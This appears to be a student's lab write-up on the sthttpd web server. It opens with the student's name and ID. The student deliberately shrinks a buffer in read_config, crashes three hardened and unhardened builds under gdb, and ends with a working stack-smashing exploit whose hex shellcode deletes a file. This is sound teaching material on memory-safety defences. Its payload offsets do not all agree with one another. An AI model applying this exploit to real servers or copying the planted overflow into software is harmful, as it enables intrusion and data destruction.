@@ -1,0 +1,311 @@
+Marko Sevo
+704833042
+
+1/2)
+I first downloaded the sthttpd-2.27.0 file and then used the following command to copy it to the linux server:
+scp -r ~/Downloads/sthttpd-2.27.0 classmse@lnxsrv09.seas.ucla.edu:~
+
+I then opened the thttpd.c file in the src folder using vim and added the described patch by changing “char line[10000];” to “char line[100];” and “fgets( line, sizeof(line), fp )” to
+“fgets( line, 1000, fp )”. This made the buffer size smaller and made the while loop go past the end of the buffer, allowing us to exploit this buffer overrun.
+
+I then called the following command to configure sthttpd:
+./configure \
+LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+I made three different versions of thttpd with the following commands:
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+
+3/4)
+I then had to test that the servers were working so i created a file foo.txt that simply had my name in it using vim. I calculated the port number using the formula (12330 + 3 * (X % 293) + Y),
+where X is my 9-digit student ID and Y is either 1, 2, or 3 depending on which variant of the daemon I’m running (1=SP, 2=AS, 3=NO).
+I first ran the following command:
+
+src/thttpd-sp -p 12790 -D
+
+which would cause the server to hang, so then I opened a new terminal window and ran this command:
+
+curl http://localhost:12790/foo.txt
+
+which outputted what was in foo.txt, “Marko”.
+
+I repeated this process twice more with thttpd-as and thttpd-no, using the numbers 12791 and 12792, respectively.
+
+5)
+To crash the first variant, I first created a text file config.txt that began with “port=“ (a keyword defined in thttpd.c) and then followed this with around 400 “0’s”.
+I then ran the following commands:
+gdb src/thttpd-sp 
+(gdb) run -p 12790 -D -C config.txt
+
+This resulted in a segmentation fault because of the buffer overrun with the following outout:
+Starting program: /w/home.14/class/classmse/sthttpd-2.27.0/src/thttpd-sp -p 12790 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+*** stack smashing detected ***: /w/home.14/class/classmse/sthttpd-2.27.0/src/thttpd-sp terminated
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+
+I ran a backtrace using the command:
+(gdb) bt
+
+and got the following output:
+#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404cb3 in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x6f6f6f6f6f6f6f6f in ?? ()
+#8  0x6f6f6f6f6f6f6f6f in ?? ()
+#9  0x6f6f6f6f6f6f6f6f in ?? ()
+#10 0x6f6f6f6f6f6f6f6f in ?? ()
+#11 0x6f6f6f6f6f6f6f6f in ?? ()
+#12 0x6f6f6f6f6f6f6f6f in ?? ()
+#13 0x6f6f6f6f6f6f6f6f in ?? ()
+#14 0x6f6f6f6f6f6f6f6f in ?? ()
+#15 0x6f6f6f6f6f6f6f6f in ?? ()
+#16 0x6f6f6f6f6f6f6f6f in ?? ()
+#17 0x6f6f6f6f6f6f6f6f in ?? ()
+#18 0x6f6f6f6f6f6f6f6f in ?? ()
+#19 0x6f6f6f6f6f6f6f6f in ?? ()
+#20 0x6f6f6f6f6f6f6f6f in ?? ()
+#21 0x6f6f6f6f6f6f6f6f in ?? ()
+#22 0x6f6f6f6f6f6f6f6f in ?? ()
+#23 0x6f6f6f6f6f6f6f6f in ?? ()
+#24 0x6f6f6f6f6f6f6f6f in ?? ()
+#25 0x6f6f6f6f6f6f6f6f in ?? ()
+#26 0x6f6f6f6f6f6f6f6f in ?? ()
+#27 0x6f6f6f6f6f6f6f6f in ?? ()
+#28 0x6f6f6f6f6f6f6f6f in ?? ()
+#29 0x6f6f6f6f6f6f6f6f in ?? ()
+#30 0x6f6f6f6f6f6f6f6f in ?? ()
+#31 0x6f6f6f6f6f6f6f6f in ?? ()
+#32 0x6f6f6f6f6f6f6f6f in ?? ()
+#33 0x6f6f6f6f6f6f6f6f in ?? ()
+#34 0x6f6f6f6f6f6f6f6f in ?? ()
+#35 0x6f6f6f6f6f6f6f6f in ?? ()
+#36 0x6f6f6f6f6f6f6f6f in ?? ()
+
+This backtrace showed that the program crashed at line 1190 in the read_config function, so I used the following commands to set a breakpoint at 1188 and run the program again
+while stepping through it:
+(gdb) break 1188
+(gdb) run -p 12790 -D -C config.txt
+(gdb) set disassemble-next-line on
+(gdb) si
+0x0000000000404c01	1189	    (void) fclose( fp );
+   0x0000000000404bfe <read_config+1182>:	4c 89 e7	mov    %r12,%rdi
+=> 0x0000000000404c01 <read_config+1185>:	e8 0a d5 ff ff	callq  0x402110 <fclose@plt>
+(gdb) ni
+
+after stepping through a couple more steps, I saw:  
+
+0x0000000000404c14	1190	    }
+   0x0000000000404c06 <read_config+1190>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+   0x0000000000404c0b <read_config+1195>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+=> 0x0000000000404c14 <read_config+1204>:	0f 85 94 00 00 00	jne    0x404cae <read_config+1358>
+   0x0000000000404c1a <read_config+1210>:	48 83 c4 78	add    $0x78,%rsp
+   0x0000000000404c1e <read_config+1214>:	5b	pop    %rbx
+   0x0000000000404c1f <read_config+1215>:	5d	pop    %rbp
+   0x0000000000404c20 <read_config+1216>:	41 5c	pop    %r12
+   0x0000000000404c22 <read_config+1218>:	41 5d	pop    %r13
+   0x0000000000404c24 <read_config+1220>:	c3	retq   
+(gdb) si
+1190	    }
+=> 0x0000000000404cae <read_config+1358>:	e8 cd d4 ff ff	callq  0x402180 <__stack_chk_fail@plt>
+
+The lines at addresses 0x0000000000404c0b and 0x0000000000404c14 check if the canary placed around the buffer was changed, and since in this case it was, it jumps to “__stack_chk_fail@plt”.
+
+6) I then went on to crash the second variant in a similar manner as the first:
+gdb src/thttpd-as
+(gdb) run -p 12791 -D -C config.txt
+
+and got this output:
+Starting program: /w/home.14/class/classmse/sthttpd-2.27.0/src/thttpd-as -p 12791 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+=================================================================
+==35706==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcd44 at pc 0x00000043aec9 bp 0x7fffffffcca0 sp 0x7fffffffc450
+READ of size 403 at 0x7fffffffcd44 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+
+So, again, I ran a backtract (using “bt”), and got this:
+#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffbbc0, 
+    pc=4435657, max_depth=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
+#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, 
+    bp=140737488342176, pc=4435657, max_depth=256, stack=0x7fffffffbbc0)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
+#4  __asan::ReportGenericError (pc=<optimized out>, bp=bp@entry=140737488342176, 
+    sp=sp@entry=140737488340048, addr=addr@entry=140737488342340, is_write=is_write@entry=false, 
+    access_size=access_size@entry=403, exp=<optimized out>, fatal=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
+#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>, c=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+#6  0x00000000004e0b51 in read_config (filename=<optimized out>) at thttpd.c:1018
+#7  0x6f6f6f6f6f6f6f6f in ?? ()
+#8  0x6f6f6f6f6f6f6f6f in ?? ()
+#9  0x6f6f6f6f6f6f6f6f in ?? ()
+#10 0x6f6f6f6f6f6f6f6f in ?? ()
+#11 0x6f6f6f6f6f6f6f6f in ?? ()
+#12 0x6f6f6f6f6f6f6f6f in ?? ()
+#13 0x6f6f6f6f6f6f6f6f in ?? ()
+#14 0x6f6f6f6f6f6f6f6f in ?? ()
+#15 0x6f6f6f6f6f6f6f6f in ?? ()
+#16 0x6f6f6f6f6f6f6f6f in ?? ()
+#17 0x6f6f6f6f6f6f6f6f in ?? ()
+#18 0x6f6f6f6f6f6f6f6f in ?? ()
+#19 0x6f6f6f6f6f6f6f6f in ?? ()
+#20 0x6f6f6f6f6f6f6f6f in ?? ()
+#21 0x6f6f6f6f6f6f6f6f in ?? ()
+#22 0x6f6f6f6f6f6f6f6f in ?? ()
+#23 0x6f6f6f6f6f6f6f6f in ?? ()
+#24 0x6f6f6f6f6f6f6f6f in ?? ()
+#25 0x6f6f6f6f6f6f6f6f in ?? ()
+#26 0x6f6f6f6f6f6f6f6f in ?? ()
+#27 0x6f6f6f6f6f6f6f6f in ?? ()
+#28 0x6f6f6f6f6f6f6f6f in ?? ()
+
+
+So I decide to set a breakpoint at line 1016 (a little before 1018 that the backtrace shows) and step through the program:
+(gdb) break 1016
+(gdb) run -p 12791 -D -C config.txt
+(gdb) set disassemble-next-line on
+(gdb) si
+
+After a while I get to here:
+0x00000000004e0b4c	1018		if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+   0x00000000004e0b43 <read_config+179>:	48 8b 3c 24	mov    (%rsp),%rdi
+   0x00000000004e0b47 <read_config+183>:	be 23 00 00 00	mov    $0x23,%esi
+=> 0x00000000004e0b4c <read_config+188>:	e8 2f a5 f5 ff	callq  0x43b080 <__interceptor_strchr(char const*, int)>
+   0x00000000004e0b51 <read_config+193>:	48 85 c0	test   %rax,%rax
+   0x00000000004e0b54 <read_config+196>:	74 24	je     0x4e0b7a <read_config+234>
+
+This “__interceptor_strchr(char const*, int)” basically goes on to crash the program by calling a series of other functions such as “__asan_region_is_poisoned” because of the buffer overflow.
+
+
+7) Finally, I go on to crash the third variant as follows:
+gdb src/thttpd-no
+(gdb) run -p 12792 -D -C config.txt
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+1190	    }
+   0x0000000000404d93 <read_config+1203>:	48 83 c4 70	add    $0x70,%rsp
+   0x0000000000404d97 <read_config+1207>:	5b	pop    %rbx
+   0x0000000000404d98 <read_config+1208>:	5d	pop    %rbp
+   0x0000000000404d99 <read_config+1209>:	41 5c	pop    %r12
+   0x0000000000404d9b <read_config+1211>:	41 5d	pop    %r13
+   0x0000000000404d9d <read_config+1213>:	41 5e	pop    %r14
+=> 0x0000000000404d9f <read_config+1215>:	c3	retq   
+(gdb) si
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+
+
+The program crashed after the read_config function returned, meaning there was something wrong with the return address. I set a breakpoint at the beginning of the function:
+(gdb) break 1000
+
+and at the end:
+(gdb) break 1189
+
+I then ran the program:
+(gdb) run -p 12792 -D -C config.txt
+
+I issued the following command to see the registers:
+(gdb) i r
+
+which showed me that the stack pointer, rsp, was equal to 0x7fffffffced8, the return address. I ran the command:
+(gdb) x 0x7fffffffced8
+
+to follow the stack pointer to memory and saw that it pointed to a address of 0x004051df. I then continued the function until it got to the end, and then I ran “(gdb) i r” again.
+The stack pointer was the same, as expected, pointing to the return address. However, running the following again:
+(gdb) x 0x7fffffffced8
+
+showed me that the return address that rsp was pointing to was now 0x6f6f6f6f because it was overriden as a result of the buffer overflow, leading to the segmentation fault error.
+
+8) I issued the following commands to generate assembly code for the three variants:
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd.o src/thttpd-sp.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd.o src/thttpd-as.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd.o src/thttpd-no.s
+
+The Address Sanitization variant has much longer assembly code for the handle_read function than the sp and no variants. It has around 582 lines of assembly
+code while the other two are at around 175 lines.
+
+The -fstack-protector-strong technique has no additional lines of code in the handle_read function than the no variant because it uses a system of canaries that it checks
+only once at the end of read_config. If these canaries around the buffer are different, that means the buffer overrun was exploited and it calls the appropriate function to crash the program.
+
+The -fsanitize=address on the other handed uses shadow memory around the buffer. What this means is that it basically is always checking whether what is loaded into the buffer
+is part of this shadow memory, and if so, calls the appropriate functions to report and error and crash the program, which is why the handle_read function is so much longer for this method.
+
+9) To build an exploit through the buffer that deletes a file named target.txt, I first used vim to create a text file named “target.txt” which I simply populated with the text
+“target.txt”. Then I ran the program and set a breakpoint at the beginning of the read_config function with the following commands:
+gdb src/thttpd-no
+(gdb) break read_config
+(gdb) run -p 12792 -D -C config.txt
+
+I used the “(gdb) i r” command to print out the registers, showing me that rsp was 0x7fffffffced8.
+I then ran the following command to give me the address of where the buffer started:
+(gdb) p &line
+
+This address was 0x7fffffffce40. Then, I subtracted those two hexadecimal values (0x7fffffffced8 - 0x7fffffffce40) resulting in the decimal result of 152. This meant that there were
+152 bytes between the start of the buffer and the return address. So, what I had to do was reach the return address, override it to return to an address which contained my code that
+would delete the target.txt file. So, the next thing I did was calculate the hex value of target.txt by using the command:
+xxd “target.txt”
+
+which outputted 74 61 72 67 65 74 2e 74 78 74 00. After some research I found that the unlink function which is to be used to delete target.txt uses the “syscall” function which,
+depending on what is in rax, does a specific task. In our case, if rax is populated by by 87, and rdi by the name of the file we want to delete, calling syscall deletes our file
+accordingly. So, we need the bytecode of first placing the hex formatted name of our file, target.txt, into rdi, then moving 87 into rax. What I did was create a .s assembly file
+and populated it with the following:
+mov	$0x7fffffffcfa0,%rdi
+mov	$0x57,%eax
+
+The, I ran the following two commands:
+gcc -c -o insns.o insns.s
+objdump -d insns.o
+
+This outputted the bytecode of those two assembly functions:
+48 bf a0 cf ff ff ff
+7f 00 00
+b8 57 00 00 00
+
+I then googled the bytecode of the syscall function and saw that it was 0f 05. So, the format of my exploit config.txt file should be:
+152 characters (starting with port=) + return address to my code + target.txt in hex + bytecode to delete the file
+
+The return address to the bytecode will be whatever the rsp is at the beginning + 19 bytes (8 for the return address itself and 11 for the target.txt in hex, resulting in the
+address of the beginning of the bytecode). Since this machine uses little endian, this return address will be backwards as follows:
+eb ce ff ff ff 7f 00 00
+
+Therefore, our final hex values (that will come after the first 152 bytes in config.txt) will be:
+eb ce ff ff ff 7f 00 00 74 61 72 67 65 74 2e 74 78 74 00 48 bf a0 cf ff ff ff 7f 00 00 b8 57 00 00 00 0f 05
+
+These were put into a file called myCode.txt, and then I called the command to convert it:
+cat myCode.txt | ./hex2raw > raw.txt
+
+I put the 152 characters (port= followed by 147 0’s) at the beginning of this raw.txt file, and then we are finished! Calling the following commands lead to the exploit that
+deleted the target.txt file successfully:
+gdb src/thttpd-no
+(gdb)run -p 12792 -D -C raw.txt
